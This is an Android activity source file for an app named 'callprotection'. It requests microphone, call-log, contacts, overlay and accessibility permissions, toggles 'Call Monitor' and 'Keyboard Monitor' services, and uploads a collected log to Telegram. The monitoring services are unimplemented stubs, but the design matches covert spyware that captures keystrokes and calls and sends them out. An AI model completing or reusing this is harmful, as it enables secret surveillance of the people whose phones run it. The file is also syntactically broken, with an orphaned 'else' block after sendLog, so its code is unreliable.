package com.daria.callprotection;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {

    private Button btnScanToggle, btnCallToggle, btnKeyboardToggle, btnSendLog;
    private View indicatorScan, indicatorCall, indicatorKeyboard;
    private SharedPreferences prefs;
    private Handler handler = new Handler();

    private boolean scanActive, callActive, keyboardActive;
    private boolean scanBlink, callBlink, keyboardBlink;

    private final int PERMISSION_REQUEST_CODE = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        prefs = getSharedPreferences("AppPrefs", MODE_PRIVATE);

        btnScanToggle = findViewById(R.id.btnScanToggle);
        btnCallToggle = findViewById(R.id.btnCallToggle);
        btnKeyboardToggle = findViewById(R.id.btnKeyboardToggle);
        btnSendLog = findViewById(R.id.btnSendLog);

        indicatorScan = findViewById(R.id.indicatorScan);
        indicatorCall = findViewById(R.id.indicatorCall);
        indicatorKeyboard = findViewById(R.id.indicatorKeyboard);

        loadStates();
        updateUI();

        btnScanToggle.setOnClickListener(v -> toggleScan());
        btnCallToggle.setOnClickListener(v -> toggleCall());
        btnKeyboardToggle.setOnClickListener(v -> toggleKeyboard());
        btnSendLog.setOnClickListener(v -> sendLog());

        requestAllPermissions();
        startBlinkingIndicators();
    }

    private void requestAllPermissions() {
        ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE
        }, PERMISSION_REQUEST_CODE);

        if (!Settings.canDrawOverlays(this)) {
            new AlertDialog.Builder(this)
                    .setTitle("Permission required")
                    .setMessage("Overlay permission needed")
                    .setPositiveButton("Grant", (d, w) -> {
                        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                                Uri.parse("package:" + getPackageName()));
                        startActivity(intent);
                    }).show();
        }

        if (!isAccessibilityServiceEnabled()) {
            new AlertDialog.Builder(this)
                    .setTitle("Permission required")
                    .setMessage("Enable Accessibility Service")
                    .setPositiveButton("Enable", (d, w) -> {
                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                        startActivity(intent);
                    }).show();
        }
    }

    private boolean isAccessibilityServiceEnabled() {
        // TODO: добавить проверку на включенность твоего сервиса
        return false;
    }

    private void toggleScan() {
        scanActive = !scanActive;
        if (scanActive) {
            startCallService();
            startKeyboardService();
        } else {
            stopCallService();
            stopKeyboardService();
        }
        saveStates();
        updateUI();
    }

    private void toggleCall() {
        callActive = !callActive;
        if (callActive) startCallService(); else stopCallService();
        saveStates();
        updateUI();
    }

    private void toggleKeyboard() {
        keyboardActive = !keyboardActive;
        if (keyboardActive) startKeyboardService(); else stopKeyboardService();
        saveStates();
        updateUI();
    }

    private void startCallService() {
        // TODO: старт сервиса звонков
        callBlink = true;
    }

    private void stopCallService() {
        // TODO: стоп сервиса звонков
        callBlink = false;
    }

    private void startKeyboardService() {
        // TODO: старт сервиса клавиатуры
        keyboardBlink = true;
    }

    private void stopKeyboardService() {
        // TODO: стоп сервиса клавиатуры
        keyboardBlink = false;
    }

    
    private void sendLog() {
        String logData = FileLogger.getFullLog();
        if (logData.isEmpty()) {
            Toast.makeText(this, "Лог пуст", Toast.LENGTH_SHORT).show();
            return;
        }

        // copy to clipboard
        ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        if (clipboard != null) {
            clipboard.setPrimaryClip(ClipData.newPlainText("Log", logData));
            FileLogger.log("Log copied to clipboard");
        }

        // async send
        TelegramUploader.sendTextAsync(logData, (success, info) -> {
            if (success) {
                FileLogger.log("Log sent, clearing local log");
                FileLogger.clearLog();
                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Лог отправлен и очищен", Toast.LENGTH_SHORT).show());
            } else {
                FileLogger.log("Log send failed: " + info);
                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Ошибка отправки лога", Toast.LENGTH_SHORT).show());
            }
        });
    }
 else {
                FileLogger.append("Log sending failed.\n");
            }
        } else {
            FileLogger.append("No internet. Log not sent.\n");
        }
    }

    private boolean isInternetAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkCapabilities nc = cm.getNetworkCapabilities(cm.getActiveNetwork());
        return nc != null && nc.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
    }

    private void saveStates() {
        prefs.edit()
                .putBoolean("scanActive", scanActive)
                .putBoolean("callActive", callActive)
                .putBoolean("keyboardActive", keyboardActive)
                .apply();
    }

    private void loadStates() {
        scanActive = prefs.getBoolean("scanActive", false);
        callActive = prefs.getBoolean("callActive", false);
        keyboardActive = prefs.getBoolean("keyboardActive", false);
        callBlink = callActive;
        keyboardBlink = keyboardActive;
    }

    private void updateUI() {
        btnScanToggle.setText(scanActive ? "Stop Scan" : "Start Scan");
        btnCallToggle.setText(callActive ? "Stop Call Monitor" : "Start Call Monitor");
        btnKeyboardToggle.setText(keyboardActive ? "Stop Keyboard Monitor" : "Start Keyboard Monitor");

        indicatorScan.setBackgroundColor(ContextCompat.getColor(this, scanActive ? android.R.color.holo_green_dark : android.R.color.holo_red_dark));
        indicatorCall.setBackgroundColor(ContextCompat.getColor(this, callActive ? android.R.color.holo_green_dark : android.R.color.holo_red_dark));
        indicatorKeyboard.setBackgroundColor(ContextCompat.getColor(this, keyboardActive ? android.R.color.holo_green_dark : android.R.color.holo_red_dark));
    }

    private void startBlinkingIndicators() {
        handler.postDelayed(new Runnable() {
            boolean visible = true;

            @Override
            public void run() {
                if (callBlink) {
                    indicatorCall.setAlpha(visible ? 1f : 0.3f);
                } else {
                    indicatorCall.setAlpha(1f);
                }
                if (keyboardBlink) {
                    indicatorKeyboard.setAlpha(visible ? 1f : 0.3f);
                } else {
                    indicatorKeyboard.setAlpha(1f);
                }
                visible = !visible;
                handler.postDelayed(this, 500);
            }
        }, 500);
    }
}
